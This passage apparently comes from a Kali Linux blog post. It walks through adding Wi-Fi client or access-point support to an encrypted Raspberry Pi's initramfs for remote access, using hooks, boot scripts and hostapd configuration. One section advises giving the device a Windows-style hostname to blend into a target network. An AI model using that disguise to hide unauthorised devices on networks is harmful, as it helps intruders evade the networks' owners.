<code>wlan0</code>)</em></li> <li><a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#binaries">Additional packages</a> to increase functionally. Either: <ul> <li><a href="https://w1.fi/wpa_supplicant/">wpa_supplicant</a> to connect as a client to a wireless network</li> <li><a href="https://w1.fi/hostapd/">hostapd</a> to create an access point for a new wireless network</li> </ul> </li> </ul> <p>Additionally, knowing the <strong><a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#change-the-hostname">hostname</a></strong> of your Raspberry Pi can help find it, as well as blend in, in your target environment.</p> <hr> <h3 id="interface-name">Interface Name</h3> <p>First, we need to know what our wireless interface is called.</p> <p>In Kali we <strong>disable</strong> predictable interface names by default, so the first wireless device will be <code>wlan0</code>.</p> <p>As long as there is no other hardware plugged into the Raspberry Pi at this stage, it should stand out:</p> <pre><code class="language-console">kali@kalipi:~$ ip a : lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether dc:a6:32:b0:07:ca brd ff:ff:ff:ff:ff:ff inet 192.168.42.19/24 brd 192.168.42.255 scope global dynamic eth0 valid_lft 63997sec preferred_lft 63997sec inet6 fe80::dea6:32ff:feb0:7ca/64 scope link valid_lft forever preferred_lft forever 3: wlan0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000 link/ether 2a:54:d3:ee:62:95 brd ff:ff:ff:ff:ff:ff permaddr dc:a6:32:b0:07:cb </code></pre> <hr> <h3 id="wi-fi-modules">Wi-Fi Modules</h3> <p>We are now going to discover what modules are needed in order for our wireless device to come up.</p> <p>On most ARM systems, the wireless device is typically connected via SDIO, and unfortunately we do not have a command like <a href="https://manpages.debian.org/testing/pciutils/lspci.8.en.html">lspci</a> to list any devices on the SDIO bus, but we can use <a href="https://manpages.debian.org/testing/util-linux/dmesg.1.en.html">dmesg</a> and <a href="https://manpages.debian.org/testing/grep/grep.1.en.html">grep</a> to look:</p> <pre><code class="language-console">kali@kalipi:~$ dmesg | grep wlan kali@kalipi:~$ </code></pre> <p>Since we were returned directly to the prompt, this means that &ldquo;wlan&rdquo; is not found in the dmesg output. As we mention in the Kali <a href="https://www.kali.org/docs/arm/raspberry-pi-4/">Raspberry Pi 4 documentation</a> we use the <a href="https://github.com/seemoo-lab/nexmon">nexmon</a> firmware for the Raspberry Pi devices, so lets try searching for that instead:</p> <pre><code class="language-console">kali@kalipi:~$ dmesg | grep nexmon [ 5.070542] brcmfmac: brcmf_c_preinit_dcmds: Firmware: BCM4345/6 wl0: Oct 3 2021 18:14:30 version 7.45.206 (nexmon.org: 2.2.2-343-ge3c8-dirty-5) FWID 01-88ee44ea </code></pre> <p>As we can see in the output above, <code>brcmfmac</code> is the driver that is giving us the message. There is a handy command that comes from the <a href="https://pkg.kali.org/pkg/kmod">kmod</a> package, called <a href="https://manpages.debian.org/testing/kmod/modinfo.8.en.html">modinfo</a> which will give us information about any module that the kernel has.</p> <hr> <p>Now we know that the wireless card on the Raspberry Pi uses the <code>brcmfmac</code> driver. So lets run <code>modinfo brcmfmac</code> and see what information it gives us:</p> <pre><code class="language-console">kali@kalipi:~$ modinfo brcmfmac filename: /lib/modules/5.15.44-Re4son-v8l+/kernel/drivers/net/wireless/broadcom/brcm80211/brcmfmac/brcmfmac.ko license: Dual BSD/GPL description: Broadcom 802.11 wireless LAN fullmac driver. author: Broadcom Corporation firmware: brcm/brcmfmac*-sdio.*.bin firmware: brcm/brcmfmac*-sdio.*.txt [...] srcversion: 913634DB95F858E921F71C1 [...] alias: sdio:c*v02D0dA887* depends: brcmutil,cfg80211 intree: Y name: brcmfmac vermagic: 5.15.44-Re4son-v8l+ SMP preempt mod_unload modversions aarch64 parm: txglomsz:Maximum tx packet chain size [SDIO] (int) parm: debug:Level of debug output (int) parm: p2pon:Enable legacy p2p management functionality (int) parm: feature_disable:Disable features (int) parm: alternative_fw_path:Alternative firmware path (string) parm: fcmode:Mode of firmware signalled flow control (int) parm: roamoff:Do not use internal roaming engine (int) parm: iapp:Enable partial support for the obsoleted Inter-Access Point Protocol (int) parm: ignore_probe_fail:always succeed probe for debugging (int) </code></pre> <p>As you can see, there is quite a lot of information given there. A quick overview of it:</p> <ul> <li>Where the module file is (<code>filename</code>)</li> <li>The license</li> <li>The description</li> <li>The author</li> <li>The firmware files it can use</li> <li>Aliases used to figure out if this is the module to use when a device is found</li> <li>Any module <strong>dependencies</strong> (<code>depends</code>)</li> <li>Whether the module comes from in the kernel tree</li> <li>The name of the module</li> <li>The version magic</li> <li>Any parameters (<code>params</code>)</li> </ul> <p>For what we need, the <strong>dependencies section is the key</strong>.</p> <hr> <p>When we read the man page for <a href="https://manpages.debian.org/testing/kmod/modinfo.8.en.html">modinfo</a>, we see that it offers the <code>-F</code> flag to limit the output to certain fields. Since we currently care about the dependencies, let&rsquo;s re-run <code>modinfo</code> passing <code>-F depends</code> since that is what we want to know.</p> <p>To make it easier to understand the output, we will not group multiple modules together:</p> <pre><code class="language-console">kali@kalipi:~$ modinfo -F depends brcmfmac brcmutil,cfg80211 </code></pre> <p>So in our case, the <code>brcmfmac</code> module depends on both <code>brcmutil</code>, and <code>cfg80211</code>. So we run <code>modinfo</code> on both of those as well to see their dependencies, if any:</p> <pre><code class="language-console">kali@kalipi:~$ modinfo -F depends brcmutil kali@kalipi:~$ </code></pre> <p>Notice that the line is empty. This means that brcmutil does not have any additional module dependencies.</p> <p>Now we check <code>cfg80211</code>, the other dependency that was listed:</p> <pre><code class="language-console">kali@kalipi:~$ modinfo -F depends cfg80211 rfkill </code></pre> <p>Here we see that cfg80211&rsquo;s <strong>depends</strong> has an additional dependency on the <code>rfkill</code> module. So we run <code>modinfo</code> against it as well:</p> <pre><code class="language-console">kali@kalipi:~$ modinfo -F depends rfkill kali@kalipi:~$ </code></pre> <p>Like <code>brcmutil</code>, <code>rfkill</code> does not have any output, so there are no dependencies. We now have our list of modules that we need to add to the initramfs:</p> <ul> <li><code>brcmfmac</code></li> <li><code>brcmutil</code></li> <li><code>cfg80211</code></li> <li><code>rfkill</code></li> </ul> <hr> <h3 id="wi-fi-firmware">Wi-Fi Firmware</h3> <p>We now need the firmware for the Wi-Fi card. As before, we use the <code>modinfo</code> command, but this time we will search for <code>firmware</code> to see what firmware the module can use:</p> <pre><code class="language-console">kali@kalipi:~$ modinfo brcmfmac | grep firmware firmware: brcm/brcmfmac*-sdio.*.bin firmware: brcm/brcmfmac*-sdio.*.txt [...] </code></pre> <p>On Linux systems, the <a href="https://docs.kernel.org/driver-api/firmware/fw_search_path.html">default firmware search path</a> is <code>/lib/firmware/</code> so the full path to the above would be:</p> <ul> <li><code>/lib/firmware/brcmfmac*-sdio.*.bin</code></li> <li><code>/lib/firmware/brcmfmac*-sdio.*.txt</code></li> </ul> <p>Notice the wildcards (<code>*</code>) in the firmware names. This means that it will match any of those files, so we will simply include all of the firmware that is in <code>/lib/firmware/brcm</code>, and this would allow for using wireless on not just our current Raspberry Pi 4, but if we were to plug our <a href="https://www.kali.org/blog/secure-kali-raspberry-pi/">secure Kali Pi</a> SD Card into a <a href="https://www.kali.org/docs/arm/raspberry-pi-3/">Raspberry Pi 3</a>, or maybe even the <a href="https://www.kali.org/docs/arm/raspberry-pi-zero-2-w/">Raspberry Pi Zero 2 W</a>, we would be able to get wireless on them as well.</p> <hr> <h3 id="binaries">Binaries</h3> <p>Lastly we need the the binaries that are used for connecting to wireless networks on Linux.</p> <p>A typical Kali installation has <code>NetworkManager</code> installed, and that handles wireless networks for us in a graphical desktop environment. But since we are doing this long before the full Kali system is available we need the <code>wpa_supplicant</code> binary, from the <a href="https://packages.debian.org/testing/wpasupplicant">wpasupplicant</a> package.</p> <p>Additionally, we will want to check we are online in our script using the <code>wpa_cli</code> command, which will include that as well.</p> <hr> <h2 id="change-the-hostname">Change The Hostname</h2> <p>By default, Kali images for our Raspberry Pi images are set to the <a href="https://man7.org/linux/man-pages/man7/hostname.7.html">hostname</a> of <code>kali-raspberry-pi</code>. Keeping in mind that some environments have hostname policies, you might want to change the hostname to blend in with the target network better.</p> <p>To change your hostname, you will want to run the command <a href="https://manpages.debian.org/testing/systemd/hostnamectl.1.en.html">hostnamectl</a> from the <a href="https://packages.debian.org/testing/systemd">systemd</a> package. Additionally, we will want to edit the <code>/etc/hosts</code> file, which the system uses for local name resolution.</p> <p>As an example, if we were to be deploying in a Windows heavy environment, we might want to use a host name similar to what a Windows machine might use:</p> <pre><code class="language-shell">kali@kalipi:~$ sudo hostnamectl set-hostname DESKTOP-UL8M7HT kali@kalipi:~$ kali@kalipi:~$ hostnamectl Static hostname: DESKTOP-UL8M7HT Icon name: computer Machine ID: fb22604534b6499887f59dd16c7dfb7f Boot ID: faa8f7e4d50e495faf34ab43a2cf86ba Operating System: Kali GNU/Linux Rolling Kernel: Linux 5.15.44-Re4son-v8+ Architecture: arm64 </code></pre> <p>And then edit the <code>/etc/hosts</code> file as well, changing the line that has <code>kali-raspberry-pi</code> in it to be <code>DESKTOP-UL8M7HT</code>:</p> <pre><code class="language-plaintext">127.0.1.1 DESKTOP-UL8M7HT 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouters </code></pre> <p>You will need to <strong>reboot the system</strong> for the changes to take effect.</p> <hr> <h2 id="wi-fi-connection">Wi-Fi Connection</h2> <p>Like we did with <a href="https://www.kali.org/blog/secure-kali-raspberry-pi/">secure Kali Pi</a>, we need to make changes to our system, using the information we gathered above, to boot the system, handle the Wi-Fi network, making the device accessible.</p> <h3 id="client-mode">Client Mode</h3> <p>We already know what the wireless network(s) credentials are, and now we are going to join them.</p> <hr> <p>First up is the initramfs <strong>hook for the Wi-Fi firmware</strong>.</p> <p>We will create the file <code>/etc/initramfs-tools/hooks/zz-brcm</code> and add the following:</p> <pre><code class="language-bash">#!/bin/sh set -e PREREQ=&quot;&quot; prereqs() { echo &quot;${PREREQ}&quot; } case &quot;${1}&quot; in prereqs) prereqs exit 0 ;; esac . /usr/share/initramfs-tools/hook-functions echo &quot;Copying firmware files for brcm to initramfs&quot; cp -r /lib/firmware/brcm ${DESTDIR}/lib/firmware/ </code></pre> <hr> <p>Next, we will do the <strong>hook for the modules</strong> and <strong><code>wpa_supplicant</code> files</strong> we need. We will use <code>/etc/initramfs-tools/hooks/enable-wireless</code> which contains:</p> <pre><code class="language-bash">#!/bin/sh set -e PREREQ=&quot;&quot; prereqs() { echo &quot;${PREREQ}&quot; } case &quot;${1}&quot; in prereqs) prereqs exit 0 ;; esac . /usr/share/initramfs-tools/hook-functions # Add Wi-Fi drivers WIFI_DRIVERS=&quot;brcmfmac brcmutil cfg80211 rfkill&quot; for x in ${WIFI_DRIVERS}; do manual_add_modules ${x} done copy_exec /sbin/wpa_supplicant copy_exec /sbin/wpa_cli copy_file config /etc/initramfs-tools/wpa_supplicant.conf /etc/wpa_supplicant.conf </code></pre> <hr> <p>So now that we have our hooks that copy the Wi-Fi firmware, modules, and wpa_suppliant files, we need to write <strong>a script to use them in the initramfs</strong>.</p> <p>One important thing to note about scripts in an initramfs, is that there is no guarantee on the order, so we create it with the name <code>a_enable_wireless</code> so that alphabetically it should be the first script that gets run.</p> <p>The file <code>/etc/initramfs-tools/scripts/init-premount/a_enable_wireless</code> looks like:</p> <pre><code class="language-bash">#!/bin/sh set -e PREREQ=&quot;&quot; prereqs() { echo &quot;${PREREQ}&quot; } case &quot;${1}&quot; in prereqs) prereqs exit 0 ;; esac . /scripts/functions WIFI_INTERFACE=&quot;wlan0&quot; alias WPACLI=&quot;/sbin/wpa_cli -p/tmp/wpa_supplicant -i${WIFI_INTERFACE}&quot; log_begin_msg &quot;Sleeping for 5 seconds to allow WLAN interface to become ready&quot; sleep 5 log_end_msg log_begin_msg &quot;Starting WLAN connection&quot; /sbin/wpa_supplicant -i${WIFI_INTERFACE} -c/etc/wpa_supplicant.conf -P/run/initram-wpa_supplicant.pid -B -f /tmp/wpa_supplicant.log # Wait for AUTH_LIMIT seconds, then check the status AUTH_LIMIT=60 echo -n &quot;Waiting for connection (max ${AUTH_LIMIT} seconds)&quot; while [ $AUTH_LIMIT -ge 0 -a $(WPACLI status | grep wpa_state) != &quot;wpa_state=COMPLETED&quot; ] do sleep 1 echo -n &quot;.&quot; AUTH_LIMIT=$(expr $AUTH_LIMIT - 1) done echo &quot;&quot; if [ $(WPACLI status | grep wpa_state) != &quot;wpa_state=COMPLETED&quot; ]; then ONLINE=0 log_failure_msg &quot;WLAN offline after timeout&quot; echo panic else ONLINE=1 log_success_msg &quot;WLAN online&quot; echo fi configure_networking </code></pre> <hr> <p>Additionally, we need to <strong>kill the networking once we are booted</strong>, so that the actual system can use the device and connect properly.</p> <p>This script <code>/etc/initramfs-tools/scripts/local-bottom/kill_wireless</code> is made up with:</p> <pre><code class="language-bash">#!/bin/sh set -e PREREQ=&quot;&quot; prereqs() { echo &quot;${PREREQ}&quot; } case &quot;$1&quot; in prereqs) prereqs exit 0 ;; esac echo &quot;Killing wpa_supplicant so the system takes over later&quot; kill $(cat /run/initram-wpa_supplicant.pid) </code></pre> <hr> <p>As a reminder, scripts <strong>need to be executable</strong> if you want them to run. <em>Additionally, if a hook is not marked as executable, initramfs-tools will skip that hook when running <code>update-initramfs</code>:</em></p> <pre><code class="language-console">kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/hooks/zz-brcm kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/hooks/enable-wireless kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/scripts/init-premount/a_enable_wireless kali@kalipi:~$ sudo chmod +x /etc/initramfs-tools/scripts/local-bottom/kill_wireless </code></pre> <hr> <p>Now we use the information that we have gathered ahead of time to create our <code>wpa_supplciant.conf</code> file to include the SSID &amp; PSK, and any other possible options that the Wi-Fi network connection might need. You can read more information about the file by running <code>man wpa_supplicant.conf</code>.</p> <p>A shortcut to generating one is to simply run <code>wpa_passphrase SSID PASSWORD</code> where SSID is the name of the wireless network, and PASSWORD is the passphrase (aka PSK) for the network.</p> <p>In this example, we are going to be connecting our Raspberry Pi to the network <strong>kali wireless</strong> with a passphrase of <strong>secure kali wireless</strong>.</p> <div class="notices info"> <p data-header="Info"> If your wireless network name has spaces in it, do not forget to <strong>quote the SSID</strong> in the command! </p> </div> <p>One thing to note here, when you use <code>wpa_passphrase</code> to generate the PSK, it includes the passphrase in plain text. Because of this, we will strip that line out of the file, <em>just in case if anyone else happens to come across the device and knows how to look inside an initramfs file, we do not want them seeing the plain text password to the network</em>! And because we are using <code>tee</code> rather than <code>&gt;</code> to write the file, we will see the file&rsquo;s contents as its written:</p> <pre><code class="language-console">kali@kalipi:~$ wpa_passphrase &quot;kali wireless&quot; &quot;secure kali wireless&quot; | grep -v \#psk | tee wpa_supplicant.conf </code></pre> <hr> <p>If you want to <strong>add multiple wireless networks</strong> to your <code>wpa_supplicant.conf</code> file, we can append the file rather than overwriting it:</p> <pre><code class="language-console">kali@kalipi:~$ wpa_passphrase &quot;kali wireless the second&quot; &quot;even more secure kali wireless&quot; | grep -v \#psk | tee -a wpa_supplicant.conf </code></pre> <hr> <p>Now we copy the newly generated configuration into <code>/etc/initramfs-tools/</code> as that is where our <code>enable-wireless</code> hook expects it to be:</p> <pre><code class="language-console">kali@kalipi:~$ sudo cp -v wpa_supplicant.conf /etc/initramfs-tools/wpa_supplicant.conf </code></pre> <hr> <p>As a reminder, we covered which kernel version to use in our <a href="https://www.kali.org/blog/secure-kali-raspberry-pi/#kernel">secure Kali Pi</a> post, and since we used the <a href="https://www.kali.org/docs/arm/raspberry-pi-4/">Raspberry Pi 4</a>, we will continue to do so here, so our kernel version is <code>5.15.44-Re4son-v8l+</code></p> <p>Now that we have all the parts that we need, we simply run <code>mkinitramfs -o /boot/initramfs.gz 5.15.44-Re4son-v8l+</code> to generate the initramfs file with our changes to add wireless networking.</p> <p>We can also verify that our changes are in the initramfs by running <code>lsinitramfs /boot/initramfs.gz</code> and use grep to show the files we are looking for:</p> <pre><code class="language-console">kali@kalipi:~$ mkinitramfs -o /boot/initramfs.gz 5.15.44-Re4son-v8l+ kali@kalipi:~$ kali@kalipi:~$ lsinitramfs /boot/initramfs.gz | grep -e wpa -e brcm etc/wpa_supplicant.conf usr/lib/firmware/brcm usr/lib/firmware/brcm/BCM-0a5c-6410.hcd usr/lib/firmware/brcm/BCM-0bb4-0306.hcd usr/lib/firmware/brcm/BCM43430A1.hcd usr/lib/firmware/brcm/BCM43430B0.hcd usr/lib/firmware/brcm/BCM4345C0.hcd usr/lib/firmware/brcm/BCM4345C5.hcd usr/lib/firmware/brcm/brcmfmac43430-sdio.bin usr/lib/firmware/brcm/brcmfmac43430-sdio.rpi.bin usr/lib/firmware/brcm/brcmfmac43430-sdio.txt usr/lib/firmware/brcm/brcmfmac43436-sdio.bin usr/lib/firmware/brcm/brcmfmac43436-sdio.clm_blob usr/lib/firmware/brcm/brcmfmac43436-sdio.txt usr/lib/firmware/brcm/brcmfmac43436s-sdio.bin usr/lib/firmware/brcm/brcmfmac43436s-sdio.txt usr/lib/firmware/brcm/brcmfmac43455-sdio.bin usr/lib/firmware/brcm/brcmfmac43455-sdio.clm_blob usr/lib/firmware/brcm/brcmfmac43455-sdio.nexmon-7_45_154.bin usr/lib/firmware/brcm/brcmfmac43455-sdio.nexmon-7_45_189.bin usr/lib/firmware/brcm/brcmfmac43455-sdio.nexmon-7_45_206.bin usr/lib/firmware/brcm/brcmfmac43455-sdio.rpi.bin usr/lib/firmware/brcm/brcmfmac43455-sdio.txt usr/lib/firmware/brcm/brcmfmac43456-sdio.bin usr/lib/firmware/brcm/brcmfmac43456-sdio.clm_blob usr/lib/firmware/brcm/brcmfmac43456-sdio.txt usr/lib/modules/5.15.44-Re4son-v8l+/kernel/drivers/i2c/busses/i2c-brcmstb.ko usr/lib/modules/5.15.44-Re4son-v8l+/kernel/drivers/net/wireless/broadcom/brcm80211 usr/lib/modules/5.15.44-Re4son-v8l+/kernel/drivers/net/wireless/broadcom/brcm80211/brcmfmac usr/lib/modules/5.15.44-Re4son-v8l+/kernel/drivers/net/wireless/broadcom/brcm80211/brcmfmac/brcmfmac.ko usr/lib/modules/5.15.44-Re4son-v8l+/kernel/drivers/net/wireless/broadcom/brcm80211/brcmutil usr/lib/modules/5.15.44-Re4son-v8l+/kernel/drivers/net/wireless/broadcom/brcm80211/brcmutil/brcmutil.ko usr/sbin/wpa_cli usr/sbin/wpa_supplicant </code></pre> <p>As we can see from the output, our initramfs has our <strong>modules</strong>, <strong>firmware</strong>, and <strong>wpa_supplicant files</strong> for the Wi-Fi chip the Raspberry Pi 4 uses!</p> <p>If you are only interested in using the Raspberry Pi as a Wi-Fi client, you can stop here, and unmount everything like we did in our <a href="https://www.kali.org/blog/secure-kali-raspberry-pi/">secure Kali Pi</a> blog post.</p> <hr> <h4 id="static-ip">Static IP</h4> <p>If we want to connect to a wireless network <strong>and</strong> set a static IP, we need to do similar to above. Adding in the wpa_supplicant files, but now we set the IP manually in the <code>/boot/cmdline.txt</code> file, which is what the Raspberry Pi uses for the kernel command line arguments:</p> <pre><code class="language-plaintext">ip=&lt;client-ip&gt;:&lt;server-ip&gt;:&lt;gw-ip&gt;:&lt;netmask&gt;:&lt;hostname&gt;:&lt;device&gt;:&lt;autoconf&gt;:&lt;dns0-ip&gt;:&lt;dns1-ip&gt;:&lt;ntp0-ip&gt; </code></pre> <p><em>For more information, see the <a href="https://docs.kernel.org/admin-guide/nfs/nfsroot.html">nfsroot kernel documentation</a>.</em></p> <p>The important thing is to set the options we need, and leave empty the ones we do not. The default <code>cmdline.txt</code> has the following in it:</p> <pre><code class="language-shell">kali@kalipi:~$ cat /boot/cmdline.txt console=serial0,115200 console=tty1 root=PARTUUID=da77a68a-02 rootfstype=ext4 fsck.repair=yes rootwait net.ifnames=0 </code></pre> <p>The <code>cmdline.txt</code> requires everything to be on one line, so if we want to set our IP address to <code>192.168.42.3</code>, with a gateway of <code>192.168.42.1</code>, our hostname to <code>securekalipi</code>, for the <code>wlan0</code> device, our <code>/boot/cmdline.txt</code> file will look like:</p> <pre><code class="language-plaintext">console=serial0,115200 console=tty1 root=PARTUUID=da77a68a-02 rootfstype=ext4 fsck.repair=yes rootwait net.ifnames=0 ip=192.168.42.3::192.168.42.1:255.255.255.0:securekalipi:wlan0 </code></pre> <p>As the <a href="https://docs.kernel.org/admin-guide/nfs/nfsroot.html">documentation</a> states, anything that is not specified uses the default settings, so we simply skip putting anything in between the <code>:</code> that we want to skip.</p> <hr> <h3 id="access-point-mode">Access Point Mode</h3> <div class="notices info"> <p data-header="Info"> You should not use the wireless in both access point mode and client mode at the same time. It <strong>is</strong> possible, however the networks need to be on the same channels, and we do not cover this in order to keep the blog post simple. You should only use client mode, or access point mode, but not both from this blog post. <em>We will talk about this again at the end of the blog post.</em> </p> </div> <p>Similarly to how we set up connecting our Raspberry Pi to a wireless network as a <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wi-fi---client-mode">client</a>, if we want to set it up as an access point to connect to, we need to add into the initramfs. Like last time, our Wi-Fi drivers, the firmware just this time, its different software and configurations.</p> <p>The package you would use on Linux to set up an access point is <a href="https://w1.fi/hostapd/">hostapd</a> which does not come installed by default, so we will install it first.</p> <p>As always, before we install software, we update what packages are available to ensure we are installing the newest version:</p> <pre><code class="language-console">kali@kalipi:~$ sudo apt update Hit:1 http://http.re4son-kernel.com/re4son kali-pi InRelease Hit:2 http://kali.download/kali kali-rolling InRelease Reading package lists... Done Building dependency tree... Done Reading state information... Done All packages are up to date. kali@kalipi:~$ kali@kalipi:~$ sudo apt install hostapd Reading package lists... Done Building dependency tree... Done Reading state information... Done The following NEW packages will be installed: hostapd 0 upgraded, 1 newly installed, 0 to remove and 0 not upgraded. [...] </code></pre> <hr> <p>Now we will set it up and test it, to make sure everything works, before we add it to our initramfs to use:</p> <pre><code class="language-console">kali@kalipi:~$ sudo vim /etc/hostapd/hostapd.conf </code></pre> <p>Our configuration will have us create a network on channel 7, with a network name of <strong>SecureKaliPi</strong>, and a password of <strong>SecureKaliPiWiFi</strong>.</p> <div class="notices info"> <p data-header="Info"> To use WPA2 the passphrase should be between 8 and 64 characters in length. </p> </div> <pre><code class="language-plaintext">country_code=US interface=wlan0 ssid=SecureKaliPi hw_mode=g channel=7 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_psk=16270ab793c4420e0c3dd6bf46ede4f10bd71ffbe6a79998dc70ccd8dea18680 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP </code></pre> <p>The PSK is a value derived from the SSID of the network and the password. The easiest way to get this is very similar to the way we created the wpa_supplicant.conf file <a href="https://www.kali.org/blog/remotely-accessing-secure-kali-raspberry-pi/#wi-fi---client-mode">above</a> - we run <code>wpa_passphrase SecureKaliPi SecureKaliPiWiFi</code> and then we copy the psk line that is not the plaintext password:</p> <pre><code class="language-console">kali@kali:~$ wpa_passphrase SecureKaliPi SecureKaliPiWiFi network={ ssid=&quot;SecureKaliPi&quot; #psk=&quot;SecureKaliPiWiFi&quot; psk=16270ab793c4420e0c3dd6bf46ede4f10bd71ffbe6a79998dc70ccd8dea18680 } </code></pre> <p>You can, and should, change the configuration to match your needs. If you would like to set it up to use 5GHz, you would need to change <code>hw_mode=g</code> to <code>hw_mode=a</code>, but keep in mind that if you are using 5GHz you need to change the channel. <a href="https://en.wikipedia.org/wiki/List_of_WLAN_channels">Wikipedia</a> has a list of allowed combinations for different countries.</p> <hr> <p>One setting you may want to change as well, is the <code>ignore_broadcast_ssid</code> setting.</p> <p>If we read the <a href="https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf">default configuration file</a>, we can see that this option is what will allow us to hide our SSID from being broadcast:</p> <pre><code class="language-plaintext"># Send empty SSID in beacons and ignore probe request frames that do not # specify full SSID, i.e., require stations to know SSID. # default: disabled (0) # 1 = send empty (length=0) SSID in beacon and ignore probe request for # broadcast SSID # 2 = clear SSID (ASCII 0), but keep the original length (this may be required # with some clients that do not support empty SSID) and ignore probe # requests for broadcast SSID ignore_broadcast_ssid=0 </code></pre> <hr> <p>Now that we have written our <code>hostapd.conf</code> we can quickly test if it works by running:</p> <pre><code class="language-console">kali@kalipi:~$ sudo /usr/sbin/hostapd /etc/hostapd/hostapd.conf wlan0: interface state UNINITIALIZED-&gt;COUNTRY_UPDATE wlan0: interface state COUNTRY_UPDATE-&gt;ENABLED wlan0: AP-ENABLED </code></pre> <p>If everything is set up correctly, you should see the above output. If you get any errors, you will need to correct those and re-run the command.</p> <hr> <p>Now that hostapd is set up, and we have tested that it works, lets add it to our initramfs.</p> <p>Because we need to add some binaries to the initramfs, we also need to include any dependencies that may be needed. So first we check which binary we need:</p> <pre><code class="language-console">kali@kalipi:~$ dpkg -L hostapd | grep bin /usr/sbin /usr/sbin/hostapd /usr/sbin/hostapd_cli </code></pre> <p>We need the hostapd binary, and to check its dependencies we will run <a href="https://manpages.debian.org/testing/manpages/ldd.1.en.html">ldd</a> which tells us what libraries the binary depends on:</p> <pre><code class="language-console">kali@kalipi:~$ ldd /usr/sbin/hostapd linux-vdso.so.1 (0x0000007f89561000) libnl-3.so.200 =&gt; /lib/aarch64-linux-gnu/libnl-3.so.200 (0x0000007f892e2000) libnl-genl-3.so.200 =&gt; /lib/aarch64-linux-gnu/libnl-genl-3.so.200 (0x0000007f892c1000) libnl-route-3.so.200 =&gt; /lib/aarch64-linux-gnu/libnl-route-3.so.200 (0x0000007f89219000) libdl.so.2 =&gt; /lib/aarch64-linux-gnu/libdl.so.2 (0x0000007f891f8000) libssl.so.3 =&gt; /lib/aarch64-linux-gnu/libssl.so.3 (0x0000007f89144000) libcrypto.so.3 =&gt; /lib/aarch64-linux-gnu/libcrypto.so.3 (0x0000007f88cfe000) libm.so.6 =&gt; /lib/aarch64-linux-gnu/libm.so.6 (0x0000007f88c5d000) libc.so.6 =&gt; /lib/aarch64-linux-gnu/libc.so.6 (0x0000007f88aaf000) /lib/ld-linux-aarch64.so.1 (0x0000007f89524000) </code></pre> <p>Because <code>hostapd</code> also uses <code>iw</code> to control its interfaces, we need to also include it. And like above, we want to check the dependencies it uses:</p> <pre><code class="language-console">kali@kalipi:~$ ldd /usr/sbin/iw linux-vdso.so.1 (0x0000007fba486000) libnl-genl-3.so.200 =&gt; /lib/aarch64-linux-gnu/libnl-genl-3.so.200 (0x0000007fba3c0000) libnl-3.so.200 =&gt; /lib/aarch64-linux-gnu/libnl-3.so.200 (0x0000007fba37f000) libc.so.6 =&gt; /lib/aarch64-linux-gnu/libc.so.6 (0x0000007fba1d1000) /lib/ld-linux-aarch64.so.1 (0x0000007fba449000) </code></pre> <p>As we can see, <code>hostapd</code> and <code>iw</code> rely on a number of libraries that will need to be in the initramfs.</p> <p>So we create a hook to include hostapd with these additional libraries so the hostapd and iw binaries can run, <code>/etc/initramfs-tools/hooks/hostapd</code>:</p> <pre><code class="language-bash">#!/bin/sh set -e PREREQ=&quot;&quot; prereqs() { echo &quot;${PREREQ}&quot; } case &quot;${1}&quot; in prereqs) prereqs exit 0 ;; esac . /usr/share/initramfs-tools/hook-functions copy_exec /usr/sbin/hostapd /sbin copy_exec /usr/sbin/iw # Find our library directory and copy files from there LIBC_DIR=$(ldd /usr/sbin/hostapd | sed -nr 's#.* =&gt; (/lib.*)/libc\.so\.[0-9.-]+ \(0x[[:xdigit:]]+\)$#\1#p') find -L &quot;$LIBC_DIR&quot; -maxdepth 1 -name 'libnss_files.*' -type f | while read so; do copy_exec &quot;$so&quot; done # Copy in the libnl librares that hostapd and iw depend on copy_exec &quot;/lib/aarch64-linux-gnu/libnl-route-3.so.200&quot; copy_exec &quot;/lib/aarch64-linux-gnu/libnl-genl-3.so.200&quot; copy_exec &quot;/lib/aarch64-linux-gnu/libnl-3.so.200&quot; # Copy our hostapd.conf file copy_file config /etc/hostapd/hostapd.conf /etc/hostapd # Add Wi-Fi drivers WIFI_DRIVERS=&quot;brcmfmac brcmutil cfg80211 rfkill&quot; for x in ${WIFI_DRIVERS}; do manual_add_modules ${x} done # Add Wi-Fi firmware echo &quot;Copying firmware files for brcm to initramfs&quot; cp -r /lib/firmware/brcm ${DESTDIR}/lib/firmware/ </code></pre> <hr> <p>Now we add our script, which sets our IP address (<code>192.168.42.1/24</code>) for the access point as well as makes hostapd, and DHCP server run, <code>/etc/initramfs-tools/scripts/init-premount/hostapd</code>. We will address the networking side after this script:</p> <pre><code class="language-bash">#!/bin/sh set -e PREQ=&quot;udev network&quot; prereqs() { echo &quot;$PREREQ&quot; } case &quot;$1&quot; in prereqs) prereqs exit 0 ;; esac run_hostapd() { ifconfig wlan0 up ifconfig wlan0 192.168.42.1 netmask 255.255.255.0 broadcast 192.168.42.255 route add 192.168.42.0/24 dev wlan0 exec udhcpd /etc/udhcpd.conf exec /sbin/hostapd /etc/hostapd/hostapd.conf } . /scripts/functions sleep 10 run_hostapd &amp; echo $! &gt;/run/hostapd.pid </code></pre> <hr> <p>Additionally, we want to start a DHCP server so that when we connect to the Raspberry Pi&rsquo;s access point, we get an IP address. Normally, you would use a package like <a href="https://wiki.debian.org/DHCP_Server">isc-dhcp-server</a> to run a DHCP server, but since we have 